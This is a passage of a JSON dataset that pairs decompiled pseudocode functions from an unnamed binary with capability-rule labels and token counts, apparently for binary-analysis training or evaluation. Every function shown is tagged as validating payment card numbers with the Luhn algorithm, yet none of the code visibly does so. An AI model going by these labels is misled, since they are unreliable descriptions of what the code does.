        "decompiled_code": "\nulong fcn.00057f88(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    int64_t arg1_00;\n    ulong uVar3;\n    int64_t iVar4;\n    uchar auStack56 [16];\n    \n    if (arg3 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(arg1 + 0x10) + 8);\n        arg1_00 = (**0x114d8)(3, uVar3, 0, 0, 0, 0, 1, 0, 0);\n        if (arg1_00 == 0) {\n            uVar3 = 0x21590004;\n        }\n        else {\n            iVar4 = (**0x11140)(arg2, arg3, 0, 0, arg1_00);\n            if (iVar4 == 0) {\n                (**0x11590)(arg1_00, 0);\n                uVar3 = 0x21590004;\n            }\n            else {\n                (**0x11138)(iVar4, 0, 0);\n                iVar1 = *(arg1_00 + 0xb8);\n                *(iVar1 + -0x10) = 0;\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -0x45) = 0;\n                iVar1 = *(arg1_00 + 0xb8);\n                *(iVar1 + -0x48) = 0xf;\n                *(iVar1 + -0x47) = 7;\n                *(iVar1 + -0x20) = uVar3;\n                *(iVar1 + -0x18) = *(arg1 + 0x10);\n                *(iVar1 + -0x3c) = 0;\n                *(iVar1 + -0x40) = arg3;\n                *(arg1_00 + 8) = iVar4;\n                uVar2 = fcn.0006558c(arg1_00, uVar3, auStack56, 0xffffffff);\n                uVar3 = fcn.00066782(uVar2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 498
    },
    "00058dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00058dd0(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != 0) {\n        fcn.000666f2();\n    }\n    fcn.00062178(arg1 + 0x138);\n    if ((arg1 != 0) && (arg1 != 0x7ef38)) {\n        fcn.0001cab0(arg1, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00059640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00059640(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t arg1_00;\n    ulong uVar2;\n    char in_DL;\n    uchar auStack40 [16];\n    \n    uVar2 = *(*(arg1 + 0x18) + 8);\n    arg1_00 = (**0x114d8)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n    if (arg1_00 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        iVar1 = *(arg1_00 + 0xb8);\n        *(iVar1 + -0x10) = 0;\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -0x45) = 0;\n        iVar1 = *(arg1_00 + 0xb8);\n        *(iVar1 + -0x48) = 0xf;\n        *(iVar1 + -0x47) = 0xb;\n        *(iVar1 + -0x20) = uVar2;\n        *(iVar1 + -0x18) = *(arg1 + 0x18);\n        *(iVar1 + -0x40) = 4;\n        *(iVar1 + -0x30) = arg1;\n        *(iVar1 + -0x38) = -(in_DL != '\\0') & 0x59334;\n        uVar2 = fcn.0006558c(arg1_00, uVar2, auStack40, 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "0005add8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.0005add8(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int64_t arg1_00;\n    ulong uVar3;\n    ulong uStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong *puStack48;\n    ulong uStack40;\n    \n    uStack72._4_4_ = 0;\n    uStack64 = 3;\n    uStack72._0_4_ = arg2;\n    uVar1 = fcn.00030dc8(arg2);\n    uStack72 = CONCAT44(uStack72._4_4_, uVar1);\n    uVar2 = fcn.00030dc8(uStack72._4_4_);\n    uStack72 = uStack72 & 0xffffffff | uVar2 << 0x20;\n    puStack48 = &uStack72;\n    uStack40 = 0xc;\n    uStack56 = arg3;\n    arg1_00 = fcn.0005a0bc(arg1, arg2);\n    if (arg1_00 == 0) {\n        uVar3 = 0x21590006;\n    }\n    else {\n        uVar3 = fcn.00064248(arg1_00, &uStack56, 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 313
    },
    "0005b43c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0005b43c(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uStack88;\n    ulong uStack80;\n    uint64_t uStack72;\n    uchar auStack64 [16];\n    uchar auStack48 [32];\n    \n    fcn.0006677c(auStack64, 0, 0x20);\n    uStack80 = *arg2;\n    uStack72 = *(arg2 + 1);\n    uStack88 = arg1;\n    iVar1 = fcn.0001a9b0(auStack64, 0x5aa8c, &uStack88);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0001a9b0(auStack48, 0x5ab64, &uStack88);\n        if (iVar1 == 0) {\n            fcn.00032748(auStack64, 0);\n            fcn.00032748(auStack48, 0);\n            uVar2 = 0;\n            goto code_r0x0005b4e1;\n        }\n    }\n    uVar2 = fcn.00030eb8();\ncode_r0x0005b4e1:\n    iVar1 = fcn.00032734(auStack64);\n    if (iVar1 != 0) {\n        fcn.00032710(auStack64);\n    }\n    iVar1 = fcn.00032734(auStack48);\n    if (iVar1 != 0) {\n        fcn.00032710(auStack48);\n    }\n    return uVar2;\n}\n",
        "token_count": 366
    },
    "0005b51c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0005b51c(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    uchar auStack744 [24];\n    int64_t iStack720;\n    uchar *puStack712;\n    uchar auStack696 [56];\n    ulong uStack640;\n    ulong uStack632;\n    uint uStack40;\n    \n    fcn.0006677c(auStack696, 0, 0x298);\n    uStack640 = *arg2;\n    uStack632 = arg2[1];\n    uStack40 = 1;\n    fcn.0006677c(auStack744, 0, 0x30);\n    puStack712 = auStack696;\n    iStack720 = fcn.0005a0bc(arg1, *(arg2 + 2));\n    if (iStack720 == 0) {\n        iVar1 = 0x21590003;\n    }\n    else {\n        do {\n            iVar1 = fcn.0005b04c(auStack744);\n        } while (iVar1 == 0);\n        fcn.0005ae6c(arg1, *(arg2 + 2), 1);\n    }\n    return iVar1;\n}\n",
        "token_count": 268
    },
    "0005bd48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005bd48(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.00030c98(0x2b8);\n    if (arg1_00 != 0) {\n        fcn.0006677c(arg1_00, 0, 0x2b8);\n        *(arg1_00 + 0x10) = 0x59e6c;\n        *(arg1_00 + 0x18) = 0x5a024;\n        *(arg1_00 + 0x20) = 0x5b9f0;\n        *(arg1_00 + 8) = 0x59ec0;\n        iVar1 = fcn.00064538(arg1_00, 0x7d3c0);\n        if (iVar1 != 0) {\n            fcn.000302c0(arg1_00 + 0x78);\n            fcn.000320ec(arg1_00 + 0x38);\n            *(arg1_00 + 0x2a0) = 1;\n            *(arg1_00 + 0x2a8) = *(*(arg1 + 8) + 0x18);\n            fcn.00063bf8(*(*(arg1 + 8) + 0x18), *(arg1 + 0x130));\n            *(*(arg1 + 8) + 0x18) = 0;\n            *(arg1 + 0x130) = 0;\n            arg2[1] = 0;\n            *arg2 = arg1_00;\n            return 0;\n        }\n        fcn.00030d24(arg1_00);\n    }\n    return 0x21590004;\n}\n",
        "token_count": 408
    },
    "0005c990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0005c990(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar auStackX8 [32];\n    \n    fcn.000320ec(0x8e060);\n    uVar2 = fcn.00031204(auStackX8);\n    fcn.00066926(uVar2);\n    iVar1 = fcn.0002fc18(0x8e058);\n    if (iVar1 == 0) {\n        fcn.00032148(0x8e060);\n    }\n    else {\n        iVar1 = fcn.0001a9b0(0x8e048, 0x5c8a8, 0);\n        if (iVar1 == 0) {\n            *0x8e080 = 1;\n            return 1;\n        }\n        fcn.00032148(0x8e060);\n        fcn.0002fc94(0x8e058);\n    }\n    return 0;\n}\n",
        "token_count": 221
    },
    "0005cdd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005cdd4(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    fcn.00030310(0x8e290);\n    puVar3 = 0x8e090;\n    iVar2 = 0x40;\n    do {\n        arg1 = *puVar3;\n        while (arg1 != NULL) {\n            puVar1 = *arg1;\n            fcn.00030d24(arg1);\n            arg1 = puVar1;\n        }\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    fcn.00030378(0x8e290);\n    if (*0x8e290 != 0) {\n        fcn.00030d24(*0x8e290);\n        *0x8e290 = 0;\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0005d594": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005d594(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong auStackX8 [4];\n    \n    do {\n        iVar1 = fcn.00030334(arg1 + 0x118);\n        if (iVar1 != 0) {\n            if (*(arg1 + 0xf8) == 0) {\n                fcn.00030378(arg1 + 0x118);\ncode_r0x0005d603:\n                if (*(arg1 + 0xf8) != 0) {\n                    if (*(arg1 + 0xe8) == 0) {\n                        *(*(arg1 + 0xf8) + 0x108) = *(arg1 + 0xf0);\n                    }\n                    else {\n                        *(*(arg1 + 0xe8) + 0xf0) = *(arg1 + 0xf0);\n                    }\n                    if (*(arg1 + 0xf0) == 0) {\n                        *(*(arg1 + 0xf8) + 0x100) = *(arg1 + 0xe8);\n                    }\n                    else {\n                        *(*(arg1 + 0xf0) + 0xe8) = *(arg1 + 0xe8);\n                    }\n                    fcn.00030378(*(arg1 + 0xf8) + 0x118);\n                    fcn.00030378(arg1 + 0x118);\n                }\n                if (*(arg1 + 0x100) != 0) {\n                    fcn.00030310(arg1 + 0x118);\n                    iVar2 = *(arg1 + 0x100);\n                    while (arg1_00 = iVar2,  arg1_00 != 0) {\n                        iVar2 = *(arg1_00 + 0xe8);\n                        if ((*(arg1_00 + 0x138) != 0) || (*(arg1_00 + 0x134) != 0)) {\n                            fcn.0005d594(arg1_00);\n                        }\n                    }\n                    iVar2 = *(arg1 + 0x100);\n                    *(arg1 + 0x110) = 0;\n                    for (; iVar2 != 0; iVar2 = *(iVar2 + 0xe8)) {\n                        fcn.00030310(iVar2 + 0x118);\n                        *(iVar2 + 0xf8) = 0;\n                        *(iVar2 + 0xf0) = 0;\n                        *(iVar2 + 0xe8) = 0;\n                        fcn.00030378(iVar2 + 0x118);\n                    }\n                    *(arg1 + 0x108) = 0;\n                    *(arg1 + 0x100) = 0;\n                    fcn.00030378(arg1 + 0x118);\n                }\n                fcn.0002fc94(arg1 + 0x120);\n                fcn.000302e8(arg1 + 0x118);\n                fcn.000302e8(arg1 + 0x128);\n                iVar1 = fcn.00032734(arg1 + 0x20);\n                if (iVar1 != 0) {\n                    fcn.00032710(arg1 + 0x20);\n                }\n                if ((arg1 != 0) && (arg1 != 0x7ef38)) {\n                    fcn.0001cab0(arg1, 0x7346744e);\n                }\n                return;\n            }\n            iVar1 = fcn.00030334(*(arg1 + 0xf8) + 0x118);\n            if (iVar1 != 0) goto code_r0x0005d603;\n            fcn.00030378(arg1 + 0x118);\n        }\n        auStackX8[0] = 0xffffffffffffd8f0;\n        (**0x115e8)(0, 0, auStackX8);\n    } while( true );\n}\n",
        "token_count": 876
    },
    "0005d870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005d870(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    if (*(arg1 + 8) == 0) {\n        fcn.000633cc(*(arg1 + 0x10), arg2, arg3, arg1 + 0x30);\n    }\n    else {\n        fcn.000632c4(*(arg1 + 8), arg2, arg3, 0);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "0005daec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0005daec(int64_t arg1, ulong arg2)\n\n{\n    if (*(arg1 + 8) == 0) {\n        fcn.000635ac(*(arg1 + 0x10), arg2, arg1 + 0x30, 0);\n    }\n    else {\n        fcn.000634f4(*(arg1 + 8), arg2, 0);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00061e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00061e40(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t in_stack_00000028;\n    \n    fcn.00030310(arg1 + 0x20);\n    fcn.00030310(arg1 + 0x28);\n    iVar1 = fcn.00061c48(arg1, arg2, 0, 8);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00061c0c(arg1, arg3, arg4, in_stack_00000028);\n    }\n    fcn.00030378(arg1 + 0x28);\n    fcn.00030378(arg1 + 0x20);\n    return iVar1;\n}\n",
        "token_count": 178
    },
    "0006214c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0006214c(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    \n    fcn.0006677c(arg1, 0, 0x28);\n    *(arg1 + 0x20) = 0;\n    iVar1 = fcn.00030cc4(0x18);\n    *(arg1 + 0x18) = iVar1;\n    if (iVar1 != 0) {\n        (*_fcn.00011608)(iVar1, 1, 0, in_R9, unaff_RBX);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 154
    },
    "00062178": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00062178(ulong *arg1)\n\n{\n    ulong *puVar1;\n    char cVar2;\n    ulong *arg1_00;\n    uint8_t uVar3;\n    uint64_t in_RDX;\n    \n    cVar2 = in_RDX;\n    uVar3 = (**0x113f0)(arg1 + 4);\n    arg1_00 = *arg1;\n    while (arg1_00 != NULL) {\n        puVar1 = *arg1_00;\n        if (cVar2 != '\\0') {\n            fcn.00030d24(arg1_00[1]);\n        }\n        fcn.00030d24(arg1_00);\n        arg1_00 = puVar1;\n    }\n    (**0x113e8)(arg1 + 4, in_RDX & 0xffffffffffffff00 | uVar3);\n    fcn.0002fc94(arg1 + 3);\n    // WARNING: Could not recover jumptable at 0x0006677c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11188)(arg1, 0, 0x28);\n    return;\n}\n",
        "token_count": 263
    },
    "0006233c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0006233c(void)\n\n{\n    fcn.000302c0(0x8e2a0);\n    *0x8e298 = 0;\n    return;\n}\n",
        "token_count": 44
    },
    "000627bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.000627bc(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t in_stack_00000028;\n    \n    if (arg1 == NULL) {\n        uVar3 = fcn.00064414(arg2, arg3, arg4, in_stack_00000028);\n    }\n    else {\n        uVar3 = fcn.00062644(arg1);\n        if (uVar3 == 0) {\n            if ((***arg1 < 0x5d) || (pcVar1 = *(**arg1 + 0x17),  pcVar1 == NULL)) {\n                fcn.0006257c(arg1);\n                uVar3 = 0x21590001;\n            }\n            else {\n                uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n                if (uVar2 == 0) {\n                    uVar2 = fcn.00064414(arg2, arg3, arg4, in_stack_00000028);\n                }\n                uVar3 = uVar2;\n                fcn.0006257c(arg1);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 297
    },
    "00062c38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00062c38(void)\n\n{\n    fcn.000302c0(0x8e2b0);\n    *0x8e2a8 = 0;\n    return;\n}\n",
        "token_count": 46
    },
    "00062ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00062ee0(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n\n{\n    fcn.00062c64(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 59
    },
    "00062f08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00062f08(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.00062c64(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 51
    },
    "00062fb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00062fb4(int64_t **arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0005cf30(arg1, 4);\n    if ((iVar1 != 0) && (arg2 != 0)) {\n        (**(**arg1 + 0x5c))(arg1, arg2);\n        fcn.00062e90(arg1);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0006380c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0006380c(int64_t **arg1, int32_t *arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t **ppiVar3;\n    \n    *arg2 = 0;\n    ppiVar3 = arg1;\n    if (arg1 != NULL) {\n        do {\n            *arg2 = *arg2 + *(ppiVar3 + 2);\n            ppiVar3 = *ppiVar3;\n        } while (ppiVar3 != NULL);\n    }\n    iVar1 = fcn.00030c98(*arg2);\n    if (iVar1 != 0) {\n        iVar2 = 0;\n        for (; arg1 != NULL; arg1 = *arg1) {\n            fcn.0006670a(iVar2 + iVar1, arg1[1], *(arg1 + 2));\n            iVar2 = iVar2 + *(arg1 + 2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 218
    },
    "000638a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000638a0(void)\n\n{\n    fcn.000302c0(0x8e2d8);\n    *0x8e2d0 = 0;\n    return;\n}\n",
        "token_count": 46
    },
    "00063bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00063bf8(int64_t **arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0005cf30(arg1, 2);\n    if ((iVar1 != 0) && (arg2 != 0)) {\n        (**(**arg1 + 100))(arg1, arg2);\n        fcn.00063b30(arg1);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00063db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00063db0(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t in_stack_00000028;\n    \n    if (arg1 == NULL) {\n        uVar3 = fcn.00064414(arg2, arg3, arg4, in_stack_00000028);\n    }\n    else {\n        uVar3 = fcn.00063c38(arg1);\n        if (uVar3 == 0) {\n            if ((***arg1 < 0x6d) || (pcVar1 = *(**arg1 + 0x1b),  pcVar1 == NULL)) {\n                fcn.00063b30(arg1);\n                uVar3 = 0x21590001;\n            }\n            else {\n                uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n                if (uVar2 == 0) {\n                    uVar2 = fcn.00064414(arg2, arg3, arg4, in_stack_00000028);\n                }\n                uVar3 = uVar2;\n                fcn.00063b30(arg1);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 300
    },
    "0006450c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0006450c(void)\n\n{\n    fcn.000302c0(0x8e2e8);\n    *0x8e2e0 = 0;\n    return;\n}\n",
        "token_count": 46
    },
    "00064538": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00064538(int64_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong *arg1_00;\n    \n    arg1_00 = fcn.00030c98(0x18);\n    if (arg1_00 != NULL) {\n        *arg1_00 = arg2;\n        *(arg1_00 + 1) = 0;\n        *(arg1_00 + 0xc) = 0;\n        arg1_00[2] = 1;\n        *arg1 = arg1_00;\n        iVar1 = fcn.0005ce3c(arg1, 3);\n        if (iVar1 != 0) {\n            LOCK();\n            *0x8e2e0 = *0x8e2e0 + 1;\n            return 1;\n        }\n        fcn.00030d24(arg1_00);\n        *arg1 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 215
    },
    "000645c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000645c0(int64_t *arg1)\n\n{\n    (**(*arg1 + 0x10))();\n    return;\n}\n",
        "token_count": 33
    },
    "00064a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00064a1c(int64_t **arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0005cf30(arg1, 3);\n    if ((iVar1 != 0) && (arg2 != 0)) {\n        (**(**arg1 + 0x84))(arg1, arg2);\n        fcn.00064668(arg1);\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00064f84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00064f84(int64_t **arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00064a60(arg1);\n    if (iVar1 == 0) {\n        (**(**arg1 + 0x7c))(arg1, arg2);\n        fcn.00064668(arg1);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00065204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00065204(int64_t arg1, ulong noname_1, uint *arg3, uint *arg4)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t uStack56;\n    \n    if (noname_1 == '\\0') {\ncode_r0x0006521a:\n        uVar4 = 0x215900c8;\n    }\n    else {\n        uStack56 = 0;\n        iVar5 = fcn.00066824(arg1, 0x3a);\n        if (iVar5 != 0) {\n            uVar2 = fcn.00065160(arg1);\n            uStack56 = uVar2 << 0x10;\n            if (uVar2 == 0) goto code_r0x0006521a;\n            arg1 = iVar5 + 1;\n        }\n        uVar3 = fcn.00066848(arg1);\n        uVar1 = fcn.00030df4(uVar3);\n        *arg3 = 1;\n        uStack56 = uStack56 | uVar1;\n        *(arg3 + 1) = 0xe;\n        *(arg3 + 2) = uStack56;\n        *(arg3 + 6) = 2;\n        arg3[4] = 0;\n        *(arg3 + 5) = 0;\n        *arg4 = 0x16;\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 349
    },
    "00065324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00065324(ulong arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong in_stack_00000028;\n    ulong in_stack_ffffffffffffff60;\n    uint uVar3;\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    uVar3 = in_stack_ffffffffffffff60 >> 0x20;\n    fcn.00066704(auStack104, arg1);\n    puStack56 = auStack104;\n    auStack72[0] = 0x30;\n    uStack64 = 0;\n    uStack48 = 0x40;\n    uStack40 = 0;\n    uStack32 = 0;\n    uVar2 = fcn.0001e364(arg4, 0xc0000000, auStack72, auStack88, 0, CONCAT44(uVar3, 0x80), 3, 3, 0, arg3, arg2);\n    if (uVar2 == 0) {\n        uVar1 = (*_fcn.00011150)(*arg4, 0xc0000000, 0, 0, in_stack_00000028, 0);\n        uVar2 = uVar1;\n        if (uVar1 != 0) {\n            fcn.000666f2(*arg4);\n            *arg4 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 373
    },
    "0006544c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0006544c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int64_t arg3_00;\n    \n    arg3_00 = fcn.00030c98(0x25);\n    if (arg3_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        fcn.0006677c(arg3_00, 0, 0x25);\n        *(arg3_00 + 5) = 0x11;\n        *(arg3_00 + 8) = *0x15bc8;\n        *(arg3_00 + 0x10) = *0x15bd0;\n        uVar1 = *0x15bd8;\n        *(arg3_00 + 6) = 8;\n        *(arg3_00 + 0x18) = uVar1;\n        uVar2 = fcn.00065324(arg1, 0x25, arg3_00, arg2);\n        fcn.00030d24(arg3_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 259
    },
    "000654e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.000654e0(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int64_t arg3_00;\n    \n    arg3_00 = fcn.00030c98(arg3 + 0x1c);\n    if (arg3_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        fcn.0006677c(arg3_00, 0, arg3 + 0x1c);\n        *(arg3_00 + 5) = 0x10;\n        *(arg3_00 + 8) = *0x15bb0;\n        *(arg3_00 + 0x10) = *0x15bb8;\n        uVar1 = *0x15bc0;\n        *(arg3_00 + 6) = arg3;\n        *(arg3_00 + 0x18) = uVar1;\n        fcn.0006670a(arg3_00 + 0x19, arg2, arg3);\n        uVar2 = fcn.00065324(arg1, arg3 + 0x1c, arg3_00, arg4);\n        fcn.00030d24(arg3_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 301
    },
    "00065dc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00065dc8(void)\n\n{\n    ulong uVar1;\n    \n    if (*0x8e358 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = (**(*0x8e358 + 0x30))(*0x8e360);\n    }\n    return uVar1;\n}\n",
        "token_count": 79
    },
    "00065e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00065e4c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *in_stack_00000040;\n    ulong uStack88;\n    ulong uStack80;\n    uint uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    uint uStack48;\n    uint uStack44;\n    int32_t iStack24;\n    ulong uStack16;\n    \n    if ((*0x8e358 != 0) && (*0x8e360 != 0)) {\n        uStack88 = *0x7daa0;\n        uStack80 = *0x7daa8;\n        uStack72 = *0x7dab0;\n        iStack24 = 0;\n        uStack16 = 0;\n        uStack64 = arg1;\n        uStack56 = arg2;\n        uStack48 = arg3;\n        uStack44 = arg4;\n        iVar1 = (**(*0x8e358 + 0x38))(*0x8e360, &uStack88);\n        if ((iVar1 == 0) && (iStack24 != 0)) {\n            *in_stack_00000040 = uStack16;\n            return iStack24;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 292
    },
    "00065ffc": {
        "rules": [
